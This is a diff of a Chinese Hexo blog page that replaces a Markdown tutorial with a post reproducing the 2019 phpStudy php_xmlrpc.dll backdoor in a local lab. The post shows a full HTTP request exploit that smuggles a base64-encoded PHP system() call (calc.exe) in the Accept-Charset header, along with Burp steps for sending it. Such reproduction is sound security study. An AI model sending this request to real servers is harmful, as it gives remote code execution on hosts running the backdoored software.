@@ -56,21 +56,28 @@
   };
 </script>
 
-  <meta name="description" content="这是一级标题这是二级标题这是三级标题这是四级标题这是五级标题这是六级标题也可以使用-来定义一级标题=二级标题- 这是换行 当我们需要进行段落强调。  段落强调区块引用  嵌套引用  三嵌套引用  四嵌套引用     代码区块 #include &amp;lt;stdo.h&amp;gt;  int main(){     printf(&amp;quot;这是一串代码&amp;quot;); }  return 0;再强调类容两">
-<meta name="keywords" content="Markdown">
+  <meta name="description" content="之前爆出的phpstudy后门，今天来复现一下 通过爆出来的信息得知，后门隐藏再PHP文件夹里，版本分别是php-5.217，php-5.4.45。后门代码存在\ext\php_xmlrpc.dll里  我们可以打开文件搜索关键字@eval  发现确实存在后门 那么上EXP 1234567891011GET /1.php HTTP/1.1Host: secquan.orgCache-Control">
+<meta name="keywords" content="phpstudy">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Markdown基本用法.md">
-<meta property="og:url" content="http://yoursite.com/2019/09/28/Markdown基本用法/index.html">
+<meta property="og:title" content="phpstudy后门利用">
+<meta property="og:url" content="http://yoursite.com/2019/09/29/phpstudy后门利用/index.html">
 <meta property="og:site_name" content="逐日的博客">
-<meta property="og:description" content="这是一级标题这是二级标题这是三级标题这是四级标题这是五级标题这是六级标题也可以使用-来定义一级标题=二级标题- 这是换行 当我们需要进行段落强调。  段落强调区块引用  嵌套引用  三嵌套引用  四嵌套引用     代码区块 #include &amp;lt;stdo.h&amp;gt;  int main(){     printf(&amp;quot;这是一串代码&amp;quot;); }  return 0;再强调类容两">
+<meta property="og:description" content="之前爆出的phpstudy后门，今天来复现一下 通过爆出来的信息得知，后门隐藏再PHP文件夹里，版本分别是php-5.217，php-5.4.45。后门代码存在\ext\php_xmlrpc.dll里  我们可以打开文件搜索关键字@eval  发现确实存在后门 那么上EXP 1234567891011GET /1.php HTTP/1.1Host: secquan.orgCache-Control">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/213207-156665352785d3.jpg">
-<meta property="og:updated_time" content="2019-09-29T14:17:13.770Z">
+<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-50-28.png?x-oss-process=style/hexo">
+<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-52-32.png?x-oss-process=style/hexo">
+<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-59-09.png?x-oss-process=style/hexo">
+<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_10-07-39.png?x-oss-process=style/hexo">
+<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-17-32.png?x-oss-process=style/hexo">
+<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-23-19.png?x-oss-process=style/hexo">
+<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-24-22.png?x-oss-process=style/hexo">
+<meta property="og:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-29-16.png?x-oss-process=style/hexo">
+<meta property="og:updated_time" content="2019-10-01T04:41:17.945Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Markdown基本用法.md">
-<meta name="twitter:description" content="这是一级标题这是二级标题这是三级标题这是四级标题这是五级标题这是六级标题也可以使用-来定义一级标题=二级标题- 这是换行 当我们需要进行段落强调。  段落强调区块引用  嵌套引用  三嵌套引用  四嵌套引用     代码区块 #include &amp;lt;stdo.h&amp;gt;  int main(){     printf(&amp;quot;这是一串代码&amp;quot;); }  return 0;再强调类容两">
-<meta name="twitter:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/213207-156665352785d3.jpg">
-  <link rel="canonical" href="http://yoursite.com/2019/09/28/Markdown基本用法/">
+<meta name="twitter:title" content="phpstudy后门利用">
+<meta name="twitter:description" content="之前爆出的phpstudy后门，今天来复现一下 通过爆出来的信息得知，后门隐藏再PHP文件夹里，版本分别是php-5.217，php-5.4.45。后门代码存在\ext\php_xmlrpc.dll里  我们可以打开文件搜索关键字@eval  发现确实存在后门 那么上EXP 1234567891011GET /1.php HTTP/1.1Host: secquan.orgCache-Control">
+<meta name="twitter:image" content="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-50-28.png?x-oss-process=style/hexo">
+  <link rel="canonical" href="http://yoursite.com/2019/09/29/phpstudy后门利用/">
 
 
 <script id="page-configurations">
@@ -84,7 +91,7 @@
   };
 </script>
 
-  <title>Markdown基本用法.md | 逐日的博客</title>
+  <title>phpstudy后门利用 | 逐日的博客</title>
   
 
 
@@ -253,7 +260,7 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/28/Markdown基本用法/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/29/phpstudy后门利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="逐日">
@@ -265,7 +272,7 @@
       <meta itemprop="name" content="逐日的博客">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">Markdown基本用法.md
+        <h1 class="post-title" itemprop="name headline">phpstudy后门利用
 
           
         </h1>
@@ -281,7 +288,7 @@
                 
               
 
-              <time title="创建时间：2019-09-28 11:31:32" itemprop="dateCreated datePublished" datetime="2019-09-28T11:31:32+08:00">2019-09-28</time>
+              <time title="创建时间：2019-09-29 22:26:13" itemprop="dateCreated datePublished" datetime="2019-09-29T22:26:13+08:00">2019-09-29</time>
             </span>
           
             
@@ -292,22 +299,9 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-09-29 22:17:13" itemprop="dateModified" datetime="2019-09-29T22:17:13+08:00">2019-09-29</time>
+                <time title="修改时间：2019-10-01 12:41:17" itemprop="dateModified" datetime="2019-10-01T12:41:17+08:00">2019-10-01</time>
               </span>
             
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/其他/" itemprop="url" rel="index"><span itemprop="name">其他</span></a></span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -321,63 +315,33 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><p>也可以使用-来定义<br>一级标题<br>=<br>二级标题<br>-</p>
-<p>这是换行</p>
-<p>当我们需要进行段落强调。</p>
-<blockquote>
-<p>段落强调<br>区块引用</p>
-<blockquote>
-<p>嵌套引用</p>
-<blockquote>
-<p>三嵌套引用</p>
-<blockquote>
-<p>四嵌套引用</p>
-</blockquote>
-</blockquote>
-</blockquote>
-</blockquote>
-<p>代码区块</p>
-<pre><code>#include &lt;stdo.h&gt;
+        <p>之前爆出的phpstudy后门，今天来复现一下</p>
+<p>通过爆出来的信息得知，后门隐藏再PHP文件夹里，版本分别是php-5.217，php-5.4.45。后门代码存在\ext\php_xmlrpc.dll里</p>
+<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-50-28.png?x-oss-process=style/hexo" alt="blockchain"></p>
+<p>我们可以打开文件搜索关键字@eval</p>
+<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-52-32.png?x-oss-process=style/hexo" alt="blockchain"></p>
+<p>发现确实存在后门</p>
+<p>那么上EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /1.php HTTP/1.1</span><br><span class="line">Host: secquan.org</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Accept-Encoding:gzip,deflate</span><br><span class="line">Accept-Charset:这里就是要执行的命令base64加密c3lzdGVtKCdjYWxjLmV4ZScpOw==</span><br><span class="line">Cookie: UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
 
-int main(){
-    printf(&quot;这是一串代码&quot;);
-}
-
-return 0;</code></pre><p>再强调类容两侧分别加上<em>或者-,如：<br>*斜体</em> ,<em>斜体<em>。<br><strong>加粗</strong>,__加粗</em></em></p>
-<p>使用+活-标记无序列表</p>
-<ul>
-<li>第一项</li>
-</ul>
-<ul>
-<li>第二项</li>
-</ul>
-<ul>
-<li>第三项</li>
-</ul>
-<ul>
-<li>第四项</li>
-</ul>
-<p>使用有序列表，在前方使用数字标识，例如：</p>
-<ol>
-<li>黄瓜</li>
-<li>玉米</li>
-<li>茄子</li>
-</ol>
-<p>使用列表项中包含多个段落，为了保证渲染正常，*与段落首字母之间必须保留四个空格</p>
-<ul>
-<li>段落一<br>是否可啦啦啦啦啦啦啦啦啦</li>
-<li>段落二<blockquote>
-<p>去快标记<br>阿<br>分割线，加入分割线</p>
+<p>Accept-Charset就是exp的核心，我们在这里面插入命令，通过base64编码，将包发送给服务器</p>
+<p>开始实验<br>-</p>
+<p>首先我们打开phpstudy，将版本切换为php-5.4.45 + Apache</p>
+<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-59-09.png?x-oss-process=style/hexo" alt="blockchain"></p>
+<p>接下来打开burp来抓包</p>
+<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_10-07-39.png?x-oss-process=style/hexo" alt="blockchain"></p>
+<p>然后向数据内插入EXP</p>
+<p>再burp中有编码转换的模块，打开然后开始转换</p>
+<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-17-32.png?x-oss-process=style/hexo" alt="blockchain"></p>
+<p>转换完成后，将其插入语句中</p>
+<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-23-19.png?x-oss-process=style/hexo" alt="blockchain"></p>
+<p>可以看到，代码成功执行了</p>
+<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-24-22.png?x-oss-process=style/hexo" alt="blockchain"></p>
+<blockquote>
+<p>注释:如果你执行失败，就修改一下包内的数据：<code>Accept-Encoding:gzip,deflate</code> 之间不要留空格。<br>再你插入完成的语句的后门按两下回车。类似这样</p>
 </blockquote>
-</li>
-</ul>
-<hr>
-<hr>
-<p>高级插入代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fun (x: Int, y: Int): Int &#123;</span><br><span class="line">  return x + y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>插入图片</p>
-<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/213207-156665352785d3.jpg" alt="blockchain" title="测试图"></p>
+<p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-29-16.png?x-oss-process=style/hexo" alt="blockchain"></p>
+<p>本文到此结束</p>
 
     </div>
 
@@ -393,7 +357,7 @@ return 0;</code></pre><p>再强调类容两侧分别加上<em>或者-,如：<br>
           
           <div class="post-tags">
             
-              <a href="/tags/Markdown/" rel="tag"># Markdown</a>
+              <a href="/tags/phpstudy/" rel="tag"># phpstudy</a>
             
           </div>
         
@@ -403,15 +367,15 @@ return 0;</code></pre><p>再强调类容两侧分别加上<em>或者-,如：<br>
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
+                <a href="/2019/09/28/Markdown基本用法/" rel="next" title="Markdown基本用法.md">
+                  <i class="fa fa-chevron-left"></i> Markdown基本用法.md
+                </a>
+              
             </div>
 
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/09/29/phpstudy后门利用/" rel="prev" title="phpstudy后门利用">
-                  phpstudy后门利用 <i class="fa fa-chevron-right"></i>
-                </a>
               
             </div>
           </div>
@@ -463,8 +427,6 @@ return 0;</code></pre><p>再强调类容两侧分别加上<em>或者-,如：<br>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#这是一级标题"><span class="nav-number">1.</span> <span class="nav-text">这是一级标题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#这是二级标题"><span class="nav-number">1.1.</span> <span class="nav-text">这是二级标题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#这是三级标题"><span class="nav-number">1.1.1.</span> <span class="nav-text">这是三级标题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#这是四级标题"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">这是四级标题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这是五级标题"><span class="nav-number">1.1.1.1.1.</span> <span class="nav-text">这是五级标题</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这是六级标题"><span class="nav-number">1.1.1.1.1.1.</span> <span class="nav-text">这是六级标题</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
-        
       </div>
       <!--/noindex-->
 
@@ -613,7 +575,7 @@ return 0;</code></pre><p>再强调类容两侧分别加上<em>或者-,如：<br>
       repo: 'zhurihexo/zhurihexo.github.io',
       owner: '',
       admin: ['germey# GitHub repo owner and collaborators, only these guys can initialize gitHub issues'],
-      id: '09268a8860e9ff8ed4be5262b39dd42e',
+      id: 'ef83301da7bacb8370023e2a3e15646c',
         language: 'zh-CN',
       
       distractionFreeMode: 'true'
